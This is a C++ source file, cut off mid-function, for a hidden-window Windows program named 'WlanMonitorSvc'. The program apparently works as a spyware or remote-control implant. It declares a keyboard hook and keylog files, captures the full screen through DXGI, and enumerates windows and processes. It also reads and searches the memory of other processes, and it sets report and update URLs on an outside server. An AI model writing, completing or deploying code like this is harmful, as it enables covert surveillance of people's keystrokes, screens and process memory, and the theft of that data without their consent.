// PowerOFF.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <fstream>

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#include <windows.h>
#include <string>
#include <shellapi.h>
#include <wlanapi.h>
#include <urlmon.h> // 添加URL下载支持
#include <iphlpapi.h> // 添加获取MAC支持
#include <wininet.h> // 添加网络缓存清除支持
#include <psapi.h>   // 添加进程获取支持
#include <tlhelp32.h> // 添加进程快照支持
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <thread>
#include <mutex>
#include <atomic>
#include <algorithm>
#include <cctype>
#include <cstdlib>
#include <ctime>
#include <sstream>
#include <iomanip>
#include <vector>

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "urlmon.lib") // 链接网络下载库
#pragma comment(lib, "iphlpapi.lib") // 链接网络信息库
#pragma comment(lib, "wininet.lib") // 链接缓存控制库
#include <wtsapi32.h>
#include <userenv.h>
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")
#include <vfw.h>
#pragma comment(lib, "vfw32.lib")

// ==============================================================
// 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
#define MANUAL_COMPILE_VERSION "1.9.4"
#define MANUAL_BUILD_CHANNEL "stable"
// ==============================================================

#define STRINGIZE2(x) #x
#define STRINGIZE(x) STRINGIZE2(x)
#pragma message("============================================================")
#pragma message(">>> BUILDING WlanMonitorSvc VERSION: " MANUAL_COMPILE_VERSION)
#pragma message(">>> BUILDING WlanMonitorSvc CHANNEL: " MANUAL_BUILD_CHANNEL)
#pragma message(">>> If this is not the version you intend to publish, edit MANUAL_COMPILE_VERSION now.")
#pragma message("============================================================")

// 定义当前程序版本和服务器更新地址
const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION;
const std::string BUILD_CHANNEL = MANUAL_BUILD_CHANNEL;
const std::string BUILD_VERSION_MARKER = "WLANMONITOR_BUILD_VERSION=" MANUAL_COMPILE_VERSION;
const std::string BUILD_CHANNEL_MARKER = "WLANMONITOR_BUILD_CHANNEL=" MANUAL_BUILD_CHANNEL;
// 在 Debug 构建时，优先连接本地测试服务器 (127.0.0.1:5000)
#ifdef _DEBUG
const std::string UPDATE_URL_BASE = "http://127.0.0.1:5000/update/"; // 本地测试服务 (Debug)
const std::string REPORT_URL_BASE = "http://127.0.0.1:5000/report";   // 本地测试服务 (Debug)
#else
const std::string UPDATE_URL_BASE = "https://jianbingozi.com/update/"; // Cloudflare Tunnel (HTTPS)
const std::string REPORT_URL_BASE = "https://jianbingozi.com/report";  // Cloudflare Tunnel (HTTPS)
#endif

// 全局单例互斥锁句柄，放于最顶部方便所有函数调用
HANDLE g_hMutex = NULL;
ULONGLONG g_ServiceStartTime = 0; // 存放程序/服务刚启动时的时间
HHOOK g_hKeyHook = NULL;
const char* UPDATE_EXIT_EVENT_NAME = "Global\\WlanMonitorSvc_UpdateExit_Event";
const char* LOCAL_STATE_DIR = "C:\\Users\\Public\\WlanMonitorSvc_State";
const char* ACTIVE_WND_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s01.wms";
const char* VOLUME_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s02.wms";
const char* KEYLOG_CFG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s03.wms";
const char* KEYLOG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s04.wms";
const char* MEDIA_BOUNCE_CFG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\s05.wms";
const char* WIFI_SHUTDOWN_EXEMPT_CFG = "C:\\Users\\Public\\WlanMonitorSvc_State\\s06.wms";
const char* LEGACY_ACTIVE_WND_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\active_window.wms";
const char* LEGACY_VOLUME_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\volume.wms";
const char* LEGACY_KEYLOG_CFG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\keylog_cfg.wms";
const char* LEGACY_KEYLOG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\keylog.wms";
const char* LEGACY_MEDIA_BOUNCE_CFG_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\media_bounce_cfg.wms";
const char* LEGACY_WIFI_SHUTDOWN_EXEMPT_STATE = "C:\\Users\\Public\\WlanMonitorSvc_State\\wifi_shutdown_exempt.wms";
const char* LEGACY_ACTIVE_WND_TXT = "C:\\Users\\Public\\WlanMonitorSvc_ActiveWnd.txt";
const char* LEGACY_VOLUME_TXT = "C:\\Users\\Public\\WlanMonitorSvc_Volume.txt";
const char* LEGACY_KEYLOG_CFG_TXT = "C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt";
const char* LEGACY_KEYLOG_TXT = "C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt";
const char* LEGACY_MEDIA_BOUNCE_CFG_TXT = "C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt";
const char* LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT = "C:\\Users\\Public\\WlanMonitorSvc_WifiShutdownExemptCfg.txt";
std::atomic<ULONGLONG> g_LastSuccessfulHeartbeatTick{0};

bool IsUpdateExitRequested() {
    HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, UPDATE_EXIT_EVENT_NAME);
    if (hEvent) {
        bool requested = (WaitForSingleObject(hEvent, 0) == WAIT_OBJECT_0);
        CloseHandle(hEvent);
        if (requested) {
            return true;
        }
    }

    char exePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) > 0) {
        std::string flagPath = std::string(exePath) + ".update_exit";
        return GetFileAttributesA(flagPath.c_str()) != INVALID_FILE_ATTRIBUTES;
    }

    return false;
}

// 指定为Windows子系统，运行时不显示控制台黑窗
#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")

// === 添加 DXGI 截屏支持解决视频等硬件加速黑屏问题 ===
#include <d3d11.h>
#include <dxgi1_2.h>
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")

class DxgiScreenCapturer {
private:
    ID3D11Device* d3dDevice = nullptr;
    ID3D11DeviceContext* d3dContext = nullptr;
    IDXGIOutputDuplication* deskDupl = nullptr;
    ID3D11Texture2D* stagingTex = nullptr;
    int texW = 0, texH = 0;
    HBITMAP hLastBmp = NULL;

public:
    DxgiScreenCapturer() {}
    ~DxgiScreenCapturer() { Cleanup(); }

    void Cleanup() {
        if (hLastBmp) { DeleteObject(hLastBmp); hLastBmp = NULL; }
        if (stagingTex) { stagingTex->Release(); stagingTex = nullptr; }
        if (deskDupl) { deskDupl->Release(); deskDupl = nullptr; }
        if (d3dContext) { d3dContext->Release(); d3dContext = nullptr; }
        if (d3dDevice) { d3dDevice->Release(); d3dDevice = nullptr; }
        texW = 0; texH = 0;
    }

    bool Init() {
        Cleanup();
        HRESULT hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0, nullptr, 0, D3D11_SDK_VERSION, &d3dDevice, nullptr, &d3dContext);
        if (FAILED(hr)) return false;

        IDXGIDevice* dxgiDevice = nullptr;
        if (SUCCEEDED(d3dDevice->QueryInterface(__uuidof(IDXGIDevice), (void**)&dxgiDevice))) {
            IDXGIAdapter* dxgiAdapter = nullptr;
            if (SUCCEEDED(dxgiDevice->GetAdapter(&dxgiAdapter))) {
                IDXGIOutput* dxgiOutput = nullptr;
                if (SUCCEEDED(dxgiAdapter->EnumOutputs(0, &dxgiOutput))) {
                    IDXGIOutput1* dxgiOutput1 = nullptr;
                    if (SUCCEEDED(dxgiOutput->QueryInterface(__uuidof(IDXGIOutput1), (void**)&dxgiOutput1))) {
                        dxgiOutput1->DuplicateOutput(d3dDevice, &deskDupl);
                        dxgiOutput1->Release();
                    }
                    dxgiOutput->Release();
                }
                dxgiAdapter->Release();
            }
            dxgiDevice->Release();
        }
        return deskDupl != nullptr;
    }

    bool CaptureImage(HBITMAP& hBmpOut, int& outW, int& outH, int timeout = 0) {
        if (!deskDupl) {
            if (!Init()) return false;
        }

        DXGI_OUTDUPL_FRAME_INFO frameInfo;
        IDXGIResource* desktopResource = nullptr;
        HRESULT hr = deskDupl->AcquireNextFrame(timeout, &frameInfo, &desktopResource);
        if (hr == DXGI_ERROR_ACCESS_LOST) {
            Init();
            return false;
        }
        if (hr == DXGI_ERROR_WAIT_TIMEOUT) {
            if (hLastBmp) {
                hBmpOut = (HBITMAP)CopyImage(hLastBmp, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
                outW = texW;
                outH = texH;
                return hBmpOut != NULL;
            }
            return false;
        }
        if (FAILED(hr)) return false;

        bool bRet = false;
        ID3D11Texture2D* acquiredTex = nullptr;
        if (SUCCEEDED(desktopResource->QueryInterface(__uuidof(ID3D11Texture2D), (void**)&acquiredTex))) {
            D3D11_TEXTURE2D_DESC desc;
            acquiredTex->GetDesc(&desc);

            if (!stagingTex || texW != (int)desc.Width || texH != (int)desc.Height) {
                if (stagingTex) { stagingTex->Release(); stagingTex = nullptr; }
                D3D11_TEXTURE2D_DESC stagingDesc = desc;
                stagingDesc.Usage = D3D11_USAGE_STAGING;
                stagingDesc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
                stagingDesc.BindFlags = 0;
                stagingDesc.MiscFlags = 0;
                stagingDesc.MipLevels = 1;
                stagingDesc.ArraySize = 1;
                d3dDevice->CreateTexture2D(&stagingDesc, nullptr, &stagingTex);
                texW = desc.Width;
                texH = desc.Height;
            }

            if (stagingTex) {
                d3dContext->CopyResource(stagingTex, acquiredTex);
                D3D11_MAPPED_SUBRESOURCE map;
                if (SUCCEEDED(d3dContext->Map(stagingTex, 0, D3D11_MAP_READ, 0, &map))) {
                    outW = texW;
                    outH = texH;
                    HDC hdc = GetDC(NULL);
                    BITMAPINFO bmi = {0};
                    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                    bmi.bmiHeader.biWidth = outW;
                    bmi.bmiHeader.biHeight = -((int)outH);
                    bmi.bmiHeader.biPlanes = 1;
                    bmi.bmiHeader.biBitCount = 32;
                    bmi.bmiHeader.biCompression = BI_RGB;

                    void* pBits = nullptr;
                    HBITMAP hNewBmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
                    if (hNewBmp) {
                        for (UINT y = 0; y < (UINT)outH; ++y) {
                            memcpy((BYTE*)pBits + y * outW * 4, (BYTE*)map.pData + y * map.RowPitch, outW * 4);
                        }
                        if (hLastBmp) DeleteObject(hLastBmp);
                        hLastBmp = (HBITMAP)CopyImage(hNewBmp, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
                        hBmpOut = hNewBmp;
                        bRet = true;
                    }
                    ReleaseDC(NULL, hdc);
                    d3dContext->Unmap(stagingTex, 0);
                }
            }
            acquiredTex->Release();
        }
        desktopResource->Release();
        deskDupl->ReleaseFrame();
        return bRet;
    }
};



int GetVolumeNative() {
    int vol = -1;
    CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER, __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator))) {
        IMMDevice* defaultDevice = NULL;
        if (SUCCEEDED(deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice))) {
            IAudioEndpointVolume* endpointVolume = NULL;
            if (SUCCEEDED(defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume))) {
                float currentVol = 0.0f;
                endpointVolume->GetMasterVolumeLevelScalar(&currentVol);
                vol = (int)(currentVol * 100.0f + 0.5f);
                endpointVolume->Release();
            }
            defaultDevice->Release();
        }
        deviceEnumerator->Release();
    }
    CoUninitialize();
    return vol;
}

void SetVolumeNative(int level) {
    CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER, __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator))) {
        IMMDevice* defaultDevice = NULL;
        if (SUCCEEDED(deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice))) {
            IAudioEndpointVolume* endpointVolume = NULL;
            if (SUCCEEDED(defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume))) {
                float fLevel = (float)level / 100.0f;
                if (fLevel < 0.0f) fLevel = 0.0f;
                if (fLevel > 1.0f) fLevel = 1.0f;
                endpointVolume->SetMasterVolumeLevelScalar(fLevel, NULL);
                endpointVolume->Release();
            }
            defaultDevice->Release();
        }
        deviceEnumerator->Release();
    }
    CoUninitialize();
}

// 判断当前是否以管理员身份运行
bool IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin == TRUE;
}

// ---------------------- NATIVE APIS FOR TASK MANAGER -------------
// UTF-8 转 ANSI 解决日志中文WiFi名乱码的问题
std::string Utf8ToAnsi(const std::string& utf8Str);
// ANSI 转 UTF-8发给服务器
std::string AnsiToUtf8(const std::string& ansiStr);
void TrimString(std::string& s);

std::string EscapeJsonString(const std::string& input) {
    std::string output;
    for (char c : input) {
        if (c == '"') output += "\\\"";
        else if (c == '\\') output += "\\\\";
        else if (c == '\b') output += "\\b";
        else if (c == '\f') output += "\\f";
        else if (c == '\n') output += "\\n";
        else if (c == '\r') output += "\\r";
        else if (c == '\t') output += "\\t";
        else output += c;
    }
    return output;
}

struct AppsCtx {
    std::string res;
    bool first;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) {
        int length = GetWindowTextLengthA(hwnd);
        if (length == 0) return TRUE;

        char title[512] = {0};
        GetWindowTextA(hwnd, title, 511);
        std::string sTitle = title;

        if (sTitle == "Program Manager" || sTitle == "Settings" || sTitle == "Microsoft Text Input Application") return TRUE;

        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);

        if (pid == GetCurrentProcessId()) return TRUE;

        AppsCtx* ctx = (AppsCtx*)lParam;

        std::string procName = "Unknown";
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess) {
            char path[MAX_PATH] = {0};
            if (GetModuleFileNameExA(hProcess, NULL, path, MAX_PATH)) {
                std::string fullPath = path;
                size_t pos = fullPath.find_last_of("\\/");
                procName = (pos != std::string::npos) ? fullPath.substr(pos + 1) : fullPath;
            }
            CloseHandle(hProcess);
        }

        if (!ctx->first) ctx->res += ",";
        ctx->first = false;

        ctx->res += "{\"Pid\":" + std::to_string(pid) + 
                    ",\"Title\":\"" + EscapeJsonString(AnsiToUtf8(sTitle)) + "\"" +
                    ",\"ProcessName\":\"" + EscapeJsonString(AnsiToUtf8(procName)) + "\"}";
    }
    return TRUE;
}

std::string GetAppsListNative() {
    AppsCtx ctx = { "[", true };
    EnumWindows(EnumWindowsProc, (LPARAM)&ctx);
    ctx.res += "]";
    return ctx.res;
}

std::string GetProcessListNative() {
    std::string res = "[";
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe)) {
            bool first = true;
            do {
                if (!first) res += ",";
                first = false;
                SIZE_T memUsage = 0;
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    PROCESS_MEMORY_COUNTERS pmc;
                    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
                        memUsage = pmc.WorkingSetSize;
                    }
                    CloseHandle(hProcess);
                }

                int wLen = WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, NULL, 0, NULL, NULL);
                std::string exeName = "";
                if (wLen > 0) {
                    exeName.resize(wLen, 0);
                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, &exeName[0], wLen, NULL, NULL);
                    while(!exeName.empty() && exeName.back() == '\0') exeName.pop_back();
                }

                res += "{\"Id\":" + std::to_string(pe.th32ProcessID) + 
                       ",\"ProcessName\":\"" + EscapeJsonString(exeName) + "\"" +
                       ",\"WorkingSet\":" + std::to_string(memUsage) + "}";
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    res += "]";
    return res;
}

std::string ProtectToString(DWORD protect) {
    protect &= 0xff;
    switch (protect) {
        case PAGE_NOACCESS: return "NOACCESS";
        case PAGE_READONLY: return "R";
        case PAGE_READWRITE: return "RW";
        case PAGE_WRITECOPY: return "WC";
        case PAGE_EXECUTE: return "X";
        case PAGE_EXECUTE_READ: return "XR";
        case PAGE_EXECUTE_READWRITE: return "XRW";
        case PAGE_EXECUTE_WRITECOPY: return "XWC";
        default: return "UNKNOWN";
    }
}

std::string StateToString(DWORD state) {
    if (state == MEM_COMMIT) return "Commit";
    if (state == MEM_RESERVE) return "Reserve";
    if (state == MEM_FREE) return "Free";
    return "Unknown";
}

std::string TypeToString(DWORD type) {
    if (type == MEM_IMAGE) return "Image";
    if (type == MEM_MAPPED) return "Mapped";
    if (type == MEM_PRIVATE) return "Private";
    return "";
}

std::string HexPtrString(ULONG_PTR value) {
    std::ostringstream oss;
    oss << "0x" << std::uppercase << std::hex << value;
    return oss.str();
}

ULONGLONG ParseAddressValue(const std::string& s) {
    if (s.empty()) return 0;
    int base = 10;
    const char* start = s.c_str();
    if (s.size() > 2 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) {
        base = 16;
        start += 2;
    }
    return _strtoui64(start, NULL, base);
}

std::string BytesToHex(const BYTE* data, SIZE_T len) {
    static const char* hex = "0123456789ABCDEF";
    std::string out;
    out.reserve(len * 2);
    for (SIZE_T i = 0; i < len; ++i) {
        out.push_back(hex[(data[i] >> 4) & 0x0f]);
        out.push_back(hex[data[i] & 0x0f]);
    }
    return out;
}

std::string BytesToAsciiPreview(const BYTE* data, SIZE_T len) {
    std::string out;
    out.reserve(len);
    for (SIZE_T i = 0; i < len; ++i) {
        unsigned char c = data[i];
        out.push_back((c >= 32 && c <= 126) ? (char)c : '.');
    }
    return out;
}

std::string GetMemoryProcessListNative() {
    std::string res = "[";
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe)) {
            bool first = true;
            do {
                PROCESS_MEMORY_COUNTERS_EX pmc;
                ZeroMemory(&pmc, sizeof(pmc));
                DWORD handleCount = 0;
                DWORD threadCount = pe.cntThreads;
                std::string pathUtf8 = "";
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    GetProcessMemoryInfo(hProcess, (PROCESS_MEMORY_COUNTERS*)&pmc, sizeof(pmc));
                    GetProcessHandleCount(hProcess, &handleCount);
                    char path[MAX_PATH] = {0};
                    if (GetModuleFileNameExA(hProcess, NULL, path, MAX_PATH)) {
                        pathUtf8 = AnsiToUtf8(path);
                    }
                    CloseHandle(hProcess);
                }

                int wLen = WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, NULL, 0, NULL, NULL);
                std::string exeName = "";
                if (wLen > 0) {
                    exeName.resize(wLen, 0);
                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, &exeName[0], wLen, NULL, NULL);
                    while(!exeName.empty() && exeName.back() == '\0') exeName.pop_back();
                }

                if (!first) res += ",";
                first = false;
                res += "{\"Pid\":" + std::to_string(pe.th32ProcessID) +
                       ",\"Name\":\"" + EscapeJsonString(exeName) + "\"" +
                       ",\"Path\":\"" + EscapeJsonString(pathUtf8) + "\"" +
                       ",\"Threads\":" + std::to_string(threadCount) +
                       ",\"Handles\":" + std::to_string(handleCount) +
                       ",\"WorkingSet\":" + std::to_string((ULONGLONG)pmc.WorkingSetSize) +
                       ",\"PrivateBytes\":" + std::to_string((ULONGLONG)pmc.PrivateUsage) +
                       ",\"PagefileUsage\":" + std::to_string((ULONGLONG)pmc.PagefileUsage) + "}";
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    res += "]";
    return res;
}

std::string GetMemoryMapNative(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        return "{\"error\":\"OpenProcess failed: " + std::to_string(GetLastError()) + "\"}";
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    ULONG_PTR addr = (ULONG_PTR)si.lpMinimumApplicationAddress;
    ULONG_PTR maxAddr = (ULONG_PTR)si.lpMaximumApplicationAddress;
    std::string res = "[";
    bool first = true;
    int count = 0;
    while (addr < maxAddr && count < 4096) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T got = VirtualQueryEx(hProcess, (LPCVOID)addr, &mbi, sizeof(mbi));
        if (got == 0) break;

        if (!first) res += ",";
        first = false;
        ULONG_PTR base = (ULONG_PTR)mbi.BaseAddress;
        ULONG_PTR allocBase = (ULONG_PTR)mbi.AllocationBase;
        ULONGLONG size = (ULONGLONG)mbi.RegionSize;
        res += "{\"Base\":\"" + HexPtrString(base) + "\"" +
               ",\"AllocationBase\":\"" + HexPtrString(allocBase) + "\"" +
               ",\"Size\":" + std::to_string(size) +
               ",\"State\":\"" + StateToString(mbi.State) + "\"" +
               ",\"Protect\":\"" + ProtectToString(mbi.Protect) + "\"" +
               ",\"Type\":\"" + TypeToString(mbi.Type) + "\"}";

        ULONG_PTR next = base + (ULONG_PTR)mbi.RegionSize;
        if (next <= addr) break;
        addr = next;
        ++count;
    }
    CloseHandle(hProcess);
    res += "]";
    return res;
}

std::string ReadMemoryNative(DWORD pid, ULONGLONG address, SIZE_T requestedSize) {
    if (requestedSize == 0) requestedSize = 256;
    if (requestedSize > 65536) requestedSize = 65536;
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        return "{\"error\":\"OpenProcess failed: " + std::to_string(GetLastError()) + "\"}";
    }

    std::vector<BYTE> buffer(requestedSize);
    SIZE_T bytesRead = 0;
    BOOL ok = ReadProcessMemory(hProcess, (LPCVOID)(ULONG_PTR)address, buffer.data(), requestedSize, &bytesRead);
    DWORD err = ok ? 0 : GetLastError();
    CloseHandle(hProcess);
    if (!ok && bytesRead == 0) {
        return "{\"error\":\"ReadProcessMemory failed: " + std::to_string(err) + "\"}";
    }

    std::string res = "{";
    res += "\"Address\":\"" + HexPtrString((ULONG_PTR)address) + "\",";
    res += "\"Requested\":" + std::to_string((ULONGLONG)requestedSize) + ",";
    res += "\"Read\":" + std::to_string((ULONGLONG)bytesRead) + ",";
    res += "\"Hex\":\"" + BytesToHex(buffer.data(), bytesRead) + "\",";
    res += "\"Ascii\":\"" + EscapeJsonString(BytesToAsciiPreview(buffer.data(), bytesRead)) + "\"";
    if (!ok) res += ",\"warning\":\"Partial read, error " + std::to_string(err) + "\"";
    res += "}";
    return res;
}

bool IsReadableMemoryProtect(DWORD protect) {
    if (protect & PAGE_GUARD) return false;
    if (protect & PAGE_NOACCESS) return false;
    DWORD base = protect & 0xff;
    return base == PAGE_READONLY ||
           base == PAGE_READWRITE ||
           base == PAGE_WRITECOPY ||
           base == PAGE_EXECUTE_READ ||
           base == PAGE_EXECUTE_READWRITE ||
           base == PAGE_EXECUTE_WRITECOPY;
}

bool HexNibble(char c, BYTE& out) {
    if (c >= '0' && c <= '9') { out = (BYTE)(c - '0'); return true; }
    if (c >= 'a' && c <= 'f') { out = (BYTE)(10 + c - 'a'); return true; }
    if (c >= 'A' && c <= 'F') { out = (BYTE)(10 + c - 'A'); return true; }
    return false;
}

std::vector<BYTE> BuildSearchPattern(const std::string& mode, const std::string& query) {
    std::vector<BYTE> pattern;
    if (mode == "hex") {
        std::string compact;
        for (char c : query) {
            if (!isspace((unsigned char)c)) compact.push_back(c);
        }
        if (compact.size() % 2 != 0) return pattern;
        for (size_t i = 0; i < compact.size(); i += 2) {
            BYTE hi = 0, lo = 0;
            if (!HexNibble(compact[i], hi) || !HexNibble(compact[i + 1], lo)) {
                pattern.clear();
                return pattern;
            }
            pattern.push_back((BYTE)((hi << 4) | lo));
        }
    } else if (mode == "utf16") {
        int wLen = MultiByteToWideChar(CP_UTF8, 0, query.c_str(), -1, NULL, 0);
        if (wLen <= 1) return pattern;
        std::wstring wide;
        wide.resize(wLen - 1);
        MultiByteToWideChar(CP_UTF8, 0, query.c_str(), -1, &wide[0], wLen);
        pattern.reserve(wide.size() * sizeof(wchar_t));
        for (wchar_t wc : wide) {
            pattern.push_back((BYTE)(wc & 0xff));
            pattern.push_back((BYTE)((wc >> 8) & 0xff));
        }
    } else {
        pattern.assign(query.begin(), query.end());
    }
    return pattern;
}

std::string SearchMemoryNative(DWORD pid, const std::string& mode, const std::string& query) {
    std::vector<BYTE> pattern = BuildSearchPattern(mode, query);
    if (pattern.empty()) {
        return "{\"error\":\"Empty or invalid search pattern\"}";
    }
    if (pattern.size() > 4096) {
        return "{\"error\":\"Search pattern is too large\"}";
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        return "{\"error\":\"OpenProcess failed: " + std::to_string(GetLastError()) + "\"}";
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    ULONG_PTR addr = (ULONG_PTR)si.lpMinimumApplicationAddress;
    ULONG_PTR maxAddr = (ULONG_PTR)si.lpMaximumApplicationAddress;
    const SIZE_T chunkSize = 512 * 1024;
    const int maxResults = 200;
    ULONGLONG scanned = 0;
    int regionCount = 0;
    int resultCount = 0;
    bool truncated = false;
    std::string results = "[";

    while (addr < maxAddr && regionCount < 8192 && resultCount < maxResults) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T got = VirtualQueryEx(hProcess, (LPCVOID)addr, &mbi, sizeof(mbi));
        if (got == 0) break;

        ULONG_PTR base = (ULONG_PTR)mbi.BaseAddress;
        SIZE_T regionSize = mbi.RegionSize;
        if (mbi.State == MEM_COMMIT && IsReadableMemoryProtect(mbi.Protect) && regionSize > 0) {
            SIZE_T offset = 0;
            while (offset < regionSize && resultCount < maxResults) {
                SIZE_T remaining = regionSize - offset;
                SIZE_T toRead = min(chunkSize + pattern.size() - 1, remaining);
                std::vector<BYTE> buffer(toRead);
                SIZE_T bytesRead = 0;
                if (ReadProcessMemory(hProcess, (LPCVOID)(base + offset), buffer.data(), toRead, &bytesRead) && bytesRead >= pattern.size()) {
                    scanned += bytesRead;
                    auto searchStart = buffer.begin();
                    while (resultCount < maxResults) {
                        auto it = std::search(searchStart, buffer.begin() + bytesRead, pattern.begin(), pattern.end());
                        if (it == buffer.begin() + bytesRead) break;
                        SIZE_T pos = (SIZE_T)std::distance(buffer.begin(), it);
                        ULONG_PTR foundAddr = base + offset + pos;
                        SIZE_T previewLen = min((SIZE_T)64, bytesRead - pos);
                        if (resultCount > 0) results += ",";
                        results += "{\"Address\":\"" + HexPtrString(foundAddr) + "\"" +
                                   ",\"RegionBase\":\"" + HexPtrString(base) + "\"" +
                                   ",\"Protect\":\"" + ProtectToString(mbi.Protect) + "\"" +
                                   ",\"Type\":\"" + TypeToString(mbi.Type) + "\"" +
                                   ",\"Preview\":\"" + EscapeJsonString(BytesToAsciiPreview(buffer.data() + pos, previewLen)) + "\"}";
                        ++resultCount;
                        searchStart = it + 1;
                    }
                }
                if (remaining <= chunkSize) break;
                offset += chunkSize;
            }
        }

        ULONG_PTR next = base + (ULONG_PTR)mbi.RegionSize;
        if (next <= addr) break;
        addr = next;
        ++regionCount;
    }
    if (resultCount >= maxResults || regionCount >= 8192) truncated = true;
    CloseHandle(hProcess);

    results += "]";
    std::string res = "{";
    res += "\"PatternBytes\":" + std::to_string((ULONGLONG)pattern.size()) + ",";
    res += "\"Scanned\":" + std::to_string(scanned) + ",";
    res += "\"Truncated\":" + std::string(truncated ? "true" : "false") + ",";
    res += "\"Results\":" + results;
    res += "}";
    return res;
}

std::string FilterMemorySearchNative(DWORD pid, const std::string& mode, const std::string& query, const std::string& addressCsv) {
    std::vector<BYTE> pattern = BuildSearchPattern(mode, query);
    if (pattern.empty()) {
        return "{\"error\":\"Empty or invalid search pattern\"}";
    }
    if (pattern.size() > 4096) {
        return "{\"error\":\"Search pattern is too large\"}";
    }

